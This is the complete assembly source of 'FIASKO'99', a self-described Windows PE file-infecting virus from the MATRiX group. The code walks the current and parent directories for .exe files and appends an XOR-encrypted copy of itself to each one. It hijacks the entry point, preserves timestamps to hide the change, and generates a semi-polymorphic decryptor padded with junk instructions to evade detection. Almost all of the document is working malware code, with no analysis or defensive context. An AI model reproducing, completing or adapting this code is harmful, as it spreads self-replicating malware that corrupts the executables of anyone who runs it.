   ; comment "
   ; FIASKO'99 created by mort[MATRiX]
   ;          - simple PE infector with some semi-polymorph rout.
   ;          - TASM rools...
   ;          - try infect 2 files in directory
   ;          - no payload
   ;          - thanx to Lord Julus - i hope there's not to much your code...;)
   ; "


   _vSize              equ @endOfIT - @start
   _hSize              equ 060h

   .586
   .model flat,stdcall

   extrn     ExitProcess         : proc
   extrn     MessageBoxA         : proc

   .data
   dd 0

   .code

   @start:
             db _hSize dup(090h)

   @bleh:
             cld
             sti
             sbb eax,offset @start
             pushfd

             call @findKernel
             jc @nope

             add eax,078h                  ;find GetProcAddress
             xchg eax,esi
             xchg eax,ebx
             lodsd
             add eax,ebx
             add eax,018h
             xchg esi,eax

             lodsd               ;number of names
             push eax
             lodsd               ;address of funcs
             push eax
             lodsd               ;address of names
             push eax
             lodsd               ;address of ordinals
             push eax

             pop eax
             pop eax
             pop ecx
             pop edx

             add eax,ebx
             xchg eax,esi

   @nextName:
             lodsd
             add eax,ebx
             lea edi,[ebp + _GPA]
             mov ecx,_GPASize
             xchg esi,eax
             rep cmpsb
             jz @foundGPA

             xchg eax,esi
             dec edx
             jnz @nextName

   @foundGPA:
             mov eax,[esp - 4]
             sub eax,edx
             sub esp,010h
             shl eax,1
             pop esi
             add eax,ebx
             add esi,eax
             xor eax,eax
             lodsw
             shl eax,2
             pop esi
             pop esi
             add eax,ebx
             add esi,eax
             lodsd
             add eax,ebx

             mov [ebp + _GPAAdd],eax

             pop esi
             call @infect

   @nope:
             popfd
             jz @firstExecution

             mov eax,00dead00h
   _hostIP   equ $ - 4
             jmp eax

   @firstExecution:
             push 0
             call @@1
             db 'mort[MATRiX]''s virus',0
   @@1:
             call @@2
             db 'FIASKO''99 - 10x 4 nothing...',0
   @@2:
             call MessageBoxA,0
             call ExitProcess,0
   ;-----------------------------------------------------( data )------------
   _GPA                db 'GetProcAddress',0
   _GPASize            = $ - _GPA
   _GPAAdd             dd ?
   _retAdd             dd ?
   _mask               db '*.exe',0
   _fileHandle         dd ?
   _mapHandle          dd ?
   _mapBase            dd ?
   _fileTime3x         dd 0,0,0
   _newFileSize        dd ?

   _XFindFirstFile         db "FindFirstFileA",0
   _XFindNextFile          db "FindNextFileA",0
   _XGetCurrentDirectory   db "GetCurrentDirectoryA",0
   _XCreateFileMapping     db "CreateFileMappingA",0
   _XMapViewOfFile         db "MapViewOfFile",0
   _XUnmapViewOfFile       db "UnmapViewOfFile",0
   _XGetFileAttributes     db "GetFileAttributesA",0
   _XSetFileAttributes     db "SetFileAttributesA",0
   _XCreateFile            db "CreateFileA",0
   _XCloseHandle           db "CloseHandle",0
   _XSetFileTime           db "SetFileTime",0
   _XSetFilePointer        db "SetFilePointer",0
   _XSetEndOfFile          db "SetEndOfFile",0
   _XSetCurrentDirectory   db 'SetCurrentDirectoryA',0

   max_path EQU 260

   filetime                        STRUC
           FT_dwLowDateTime        DD ?
           FT_dwHighDateTime       DD ?
   filetime                        ENDS

   fileSearch                      STRUC
           FileAttributes          DD ?
           CreationTime            filetime ?
           LastAccessTime          filetime ?
           LastWriteTime           filetime ?
           FileSizeHigh            DD ?
           FileSizeLow             DD ?
           Reserved0               DD ?
           Reserved1               DD ?
           FileName                DB max_path DUP (?)
           AlternateFileName       DB 13 DUP (?)
                                   DB 3 DUP (?)
   fileSearch                      ENDS

   _crtDir             db 080h dup(0)
   _fileSearch         fileSearch <?>
   ;-----------------------------------------( call kernel API )-------------
   @cAPI:
             pop dword ptr [ebp + _retAdd]
             push eax
             db 068h
   _kernelBase         dd ?
             call [ebp + _GPAAdd]
             call eax
             jmp [ebp + _retAdd]

   ;--------------------------------------------------( find kernel base )---
   @findKernel:
             call @delta
   @delta:
             mov eax,[esp + 0ch]
             shr eax,0ch
             mov ecx,050h
             ror eax,014h
   @fKl3:
             cmp word ptr [eax],'ZM'
             jz @fKl1
   @fKl2:
             sub eax,01000h
             dec ecx
             jnz @fKl3
             pop ebp
             sub ebp,offset @delta
             stc
             ret
   @fKl1:
             push eax
             mov eax,[eax + 03ch]
             pop esi

             cmp word ptr [esi + eax],'EP'
             jnz @fKl2

             add eax,esi                             ;esi - kernel base

             pop ebp
             mov [ebp + _kernelBase - @delta],esi
             sub ebp,offset @delta

             clc                                     ;eax - kernel PE
             ret

   ;--------------------------------------------( infect )-------------------
   @infect:
             lea eax,[ebp + _crtDir]
             push eax eax
             push 080h
             lea eax,[ebp + _XGetCurrentDirectory]
             call @cAPI

   @nextDir:
             lea eax,[ebp + _XSetCurrentDirectory]
             call @cAPI

             lea eax,[ebp + _fileSearch]
             push eax
             push eax
             lea eax,[ebp + _mask]
             push eax
             lea eax,[ebp + _XFindFirstFile]
             call @cAPI

             inc eax
             jz @eou
             dec eax

             push eax            ;push handle

             call @tryInfect

             lea eax,[ebp + _XFindNextFile]
             call @cAPI

             or eax,eax
             jz @kdoMaPoradHledatNakyMenaProTyZasranyLabely ;czech rules

             call @tryInfect               ;this shit seems to be shortest

   @kdoMaPoradHledatNakyMenaProTyZasranyLabely:
             push eax

   @eou:
             pop eax
             xor al,al
             lea edi,[ebp + _crtDir]
             push edi
             cld
             repnz scasb
             mov al,'\'
             std
             repnz scasb
             inc edi
             xor al,al
             stosb
             cmp byte ptr [edi],':'
             jz @done
             jmp @nextDir

   @done:
             pop edi
             push edi
             cld

   @nextDir1:
             xor al,al
             repnz scasb
             dec edi
             mov al,'\'
             stosb
             cmp byte ptr [edi],0
             jnz @nextDir1

             lea eax,[ebp + _XSetCurrentDirectory]
             call @cAPI


             ret
   ;----------------------------( open and infect it )-----------------------
   @tryInfect:
             lea eax,[ebp + _fileSearch.FileName]
             mov esi,eax
             push 080h
             push eax
             lea eax,[ebp + _XSetFileAttributes]
             call @cAPI

             or eax,eax
             jz @eouTotal

             push 0 0 3 0 1                ;open file
             push 80000000h or 40000000h
             push esi
             lea eax,[ebp + _XCreateFile]
             call @cAPI

             inc eax
             jz @eou1
             dec eax

             mov [ebp + _fileHandle],eax   ;save time

             mov eax,[ebp + _fileSearch.FileSizeLow]
             mov [ebp + _newFileSize],eax
             add eax,01000h

             push eax
             push 0 eax 0 4 0              ;create map
             push dword ptr [ebp + _fileHandle]
             lea eax,[ebp + _XCreateFileMapping]
             call @cAPI

             inc eax
             jz @eou2
             dec eax

             mov [ebp + _mapHandle],eax

             push 0 0 2
             push eax
             lea eax,[ebp + _XMapViewOfFile]
             call @cAPI

             or eax,eax
             jz @eou3

             mov [ebp + _mapBase],eax

             xchg eax,esi
             cmp word ptr [esi],'ZM'
             jnz @fail
             cmp word ptr [esi + 038h],'TM'          ;mark of infect
             jz @fail

             mov eax,[esi + 03ch]
             cmp word ptr [esi + eax],'EP'
             jnz @fail

             call @infectFile

   @fail:
             push dword ptr [ebp + _mapBase]
             lea eax,[ebp + _XUnmapViewOfFile]
             call @cAPI

   @eou3:
             push dword ptr [ebp + _mapHandle]       ;close map
             lea eax,[ebp + _XCloseHandle]
             call @cAPI

             lea eax,[ebp + _fileSearch.CreationTime]
             push eax
             add eax,8
             push eax
             add eax,8
             push eax
             push dword ptr [ebp + _fileHandle]
             lea eax,[ebp + _XSetFileTime]
             call @cAPI

             push 0 0                                ;set new filesize
             push dword ptr [ebp + _newFileSize]
             push dword ptr [ebp + _fileHandle]
             lea eax,[ebp + _XSetFilePointer]
             call @cAPI

             push dword ptr [ebp + _fileHandle]
             lea eax,[ebp + _XSetEndOfFile]
             call @cAPI

   @eou2:
             push dword ptr [ebp + _fileHandle]
             lea eax,[ebp + _XCloseHandle]
             call @cAPI

   @eou1:
             push dword ptr [ebp + _fileSearch.FileAttributes]
             lea eax,[ebp + _fileSearch.FileName]
             push eax
             lea eax,[ebp + _XSetFileAttributes]
             call @cAPI

   @eouTotal:
             ret
   ;------------------------------------------( infect file )----------------
   _fileAlign                    dd ?
   _secAlign                     dd ?

   @infectFile:
             mov ebx,esi                   ;ebx - MZ, esi - PE
             add esi,eax

             mov eax,[esi + 038h]
             mov [ebp + _secAlign],eax
             mov eax,[esi + 03ch]
             mov [ebp + _fileAlign],eax

             mov eax,[esi + 074h]
             shl eax,3
             push eax
             xor eax,eax
             mov ax,[esi + 06h]
             mov ecx,028h
             dec eax
             mul ecx
             pop edi
             add edi,eax
             add edi,esi
             add edi,078h                  ;edi - last sec's header

             mov eax,[edi + 010h]          ;set new physical size
             add eax,_vSize
             mov ecx,[ebp + _fileAlign]
             div ecx
             inc eax
             mul ecx

             sub eax,[edi + 010h]
             add [esi + 050h],eax
             add [ebp + _newFileSize],eax
             mov edx,[edi + 010h]
             add [edi + 010h],eax

             or dword ptr [edi + 024h],0a0000020h
             mov eax,[edi + 0ch]
             add eax,edx

             mov [ebp + _xorOffs],eax

             xchg [esi + 028h],eax
             add eax,[esi + 034h]          ;host ip
             mov dword ptr [ebp + _hostIP],eax


             add [ebp + _xorOffs],_hSize   ;xored offset
             mov eax,[esi + 034h]
             add [ebp + _xorOffs],eax

             push edx
             xor edx,edx
             mov eax,[edi + 08h]
             mov ecx,[ebp + _secAlign]
             div ecx
             inc eax
             mul ecx
             mov [edi + 08h],eax
             pop edx

             mov eax,[edi + 014h]
             add eax,edx
             add eax,ebx
             xchg eax,edi

             lea esi,[ebp + @start]

             call @setHeader                         ;ok - dont laught...

             mov word ptr [ebx + 038h],'TM'          ;yesssssss, it's stupid

             mov ecx,_hSize
             rep movsb

             mov ecx,_vSize/4 - _hSize/4

             mov ebx,[ebp + _xorAdd]
             mov edx,[ebp + _xorConst]

   @nextDD2copy:
             lodsd
             xor eax,edx
             stosd
             add edx,ebx
             loop @nextDD2copy

             ret

   ;--------------------------------------( random )-------------------------
   @random:                      ;CF->1 - byte
             push ecx
             pushf
             in eax,040h
             and eax,03fh        ;we'll fit everywhere
             mov ecx,eax
             inc ecx
             xor ch,bh
   @delay:
             loop @delay
             popf
             jc @hops
             and eax,07
   @hops:
             pop ecx
             ret

   ;-------------------------------------------( set header )----------------
   _regSet             label byte
             db ?      ;xor offset
             db ?      ;xor const
             db ?      ;xor add
             db ?      ;xor size
             db ?      ;1st. usefull reg
             db ?      ;2nd. usefull reg

   _xorOffs            dd ?                ;xor offset
   _xorConst           dd ?                ;xor constant
   _xorAdd             dd ?                ;xor adding
   _xorSize            dd _vSize/4         ;xored size
   _xorNext            dd ?

   @setHeader:
             pusha

             in eax,040h
             mov [ebp + _xorConst],eax

             mov dword ptr [ebp + _regSet],0ffffffffh          ;;)
             mov word ptr [ebp + _regSet + 4],0ffffh

             lea edi,[ebp + _regSet]                 ;set registers we'll use
             mov edx,6

   @nextReg:
             clc
             call @random

             cmp al,4            ;esp
             jz @nextReg
             cmp al,5            ;ebp
             jz @nextReg

             push edi
             lea edi,[ebp + _regSet]
             mov ecx,6
             repnz scasb
             pop edi
             jz @nextReg

             stosb

             dec edx
             jnz @nextReg

             in eax,040h
             mov [ebp + _xorAdd],eax

             lea edi,[ebp + @start]
             lea esi,[ebp + _regSet]
             lea ebx,[ebp + _xorOffs]
             mov ecx,4

   @nextMOVie:
             call @addShit
             lodsb
             add al,0b8h
             xchg esi,ebx
             stosb
             lodsd
             stosd
             xchg esi,ebx
             call @addShit
             loop @nextMOVie

             call @addShit

   ;---------------------------------------------( set xor instruction )-----

             mov [ebp + _xorNext],edi
             mov al,031h
             stosb
             lea esi,[ebp + _regSet]
             xor eax,eax
             lodsb
             mov bl,al
             lodsb
             mov ecx,8
             mul ecx
             add eax,ebx
             stosb

             call @addShit
             call @addShit
   ;--------------------------------------------( set add instruction )------
             mov al,03h
             stosb
             dec esi
             lodsb
             mov bl,al
             lodsb
             xchg al,bl
             mov ecx,8
             mul ecx
             add al,bl
             add al,0c0h
             stosb

             call @addShit
             call @addShit
   ;--------------------------------------------( set 2nd add instruction )--
             mov al,083h
             stosb
             mov al,[esi - 3]
             add al,0c0h
             stosb
             mov al,4
             stosb

             call @addShit
             call @addShit
   ;--------------------------------------------( set dec instruction )------
             lodsb
             add al,048h
             stosb
   ;--------------------------------------------( set jnz instruction )------
             call @hmmm
             jmp @oneByte

             mov ax,0850fh
             stosw
             mov eax,edi
             add eax,3
             sub eax,[ebp + _xorNext]
             not eax
             stosd                         ;set 6 bytes jnz
             jmp @whoops

   @oneByte:
             mov al,075h
             stosb
             mov eax,edi
             sub eax,[ebp + _xorNext]
             not eax
             stosb                         ;set 2 bytes jnz

   @whoops:

   ;-----------------------( set last bytes stuff...)----------

             lea esi,[ebp + @bleh]

   @nextStuff:
             push esi
             sub esi,edi
             cmp esi,6
             pop esi
             jb @end

             call @addShit
             jmp @nextStuff

   @end:
             sub esi,edi
             jz @final
             mov ecx,esi

   @nextB:
             clc
             call @random
             lea esi,[ebp + _1BytesShit]
             add esi,eax
             lodsb
             stosb
             loop @nextB

   @final:
             popa
             ret
   ;-----------------------------------------------------------
   _1BytesShit         label byte
             clc
             cmc
             stc
             std
             cld
             cli
             sti
             clc
   ;-------------------------------( add shit instruction )----
   _2BytesShit         label byte
             db 033h        ;xor r32,r32
             db 087h        ;xchg r32,r32
             db 013h        ;adc r32,r32
             db 02bh        ;sub r32,r32
             db 019h        ;sbb r32,r32
             db  09h        ;or r32,r32
             db 08bh        ;mov r32,r32
             db  03h        ;add r32,r32

   _lastShit           db 0ffh

   ;---------------------------( add some code )---------------
   @addShit:
             push esi ecx edx
             call @hmmm          ;compare 2 and 3 bytes instructions
             jnz @3bytes

             call @hmmm          ;no instruction will b add
             jnz @noShit

   @nextShit:
             clc
             call @random

             lea esi,[ebp + _2BytesShit]   ;set instruction
             add esi,eax
             lodsb
             cmp [ebp + _lastShit],al
             jz @nextShit

             mov [ebp + _lastShit],al
             lea esi,[ebp + _regSet]

             cmp byte ptr [esi + 4],6      ;edi - di - ...where's the 8 bit version?
             jz @noDEC
             cmp byte ptr [esi + 5],7
             jz @noDEC
             cmp byte ptr [esi + 4],7
             jz @noDEC
             cmp byte ptr [esi + 5],6
             jz @noDEC

             push eax
             call @hmmm
             pop eax
             jz @noDEC
             dec eax

   @noDEC:
             stosb
             xor eax,eax
             mov al,[esi + 4]
             mov ecx,8
             mul ecx
             add al,[esi + 5]
             add al,0c0h
             stosb
             pop edx ecx esi
             ret

   ;-----------------------------------------------------------
   _3BytesShit         label byte
             db 08bh   ;mov reg32,[mem]
             db  03h   ;add reg32,[mem]
             db 02bh   ;sub reg32,[mem]
             db  0bh   ;or  reg32,[mem]
             db 023h   ;and reg32,[mem]
             db 033h   ;xor reg32,[mem]
             db 013h   ;adc reg32,[mem]
             db 01bh   ;sbb reg32,[mem]
   _lastShit1          db ?

   @3bytes:
             lea esi,[ebp + _3BytesShit]   ;set instruction

   @eouu:
             clc
             call @random
             cmp al,[ebp + _lastShit]
             jz @eouu

             mov [ebp + _lastShit],al
             add esi,eax
             lodsb

             cmp byte ptr [ebp + _regSet + 4],6
             jz @noDEC1
             cmp byte ptr [ebp + _regSet + 4],7
             jz @noDEC1
             cmp byte ptr [ebp + _regSet + 5],6
             jz @noDEC1
             cmp byte ptr [ebp + _regSet + 5],7
             jz @noDEC1

             push eax
             call @hmmm
             pop eax
             jz @noDEC1
             dec al

   @noDEC1:
             stosb
             xor eax,eax
             mov al,[ebp + _regSet + 4]    ;choose register
             push eax
             call @hmmm
             pop eax
             jz @ESInow                    ;the first one

             mov al,[ebp + _regSet + 5]

   @ESInow:
             mov ecx,8
             mul ecx
             add eax,5
             stosb

             stc
             call @random
             add eax,[ebp + _xorOffs]
             stosd

   @noShit:
             pop edx ecx esi
             ret
   ;------------------------------------------------------------
   @hmmm:
             push ecx edx
             call @random
             lea ecx,[ebp + @bleh]
             add ecx,eax
             mov eax,[ecx]
             xor eax,ecx
             xor edx,edx
             mov ecx,2
             div ecx
             cmp ecx,edx
             or edx,edx
             pop edx ecx
             ret

   db 'whooops'

   @endOfIT  label

   end @start
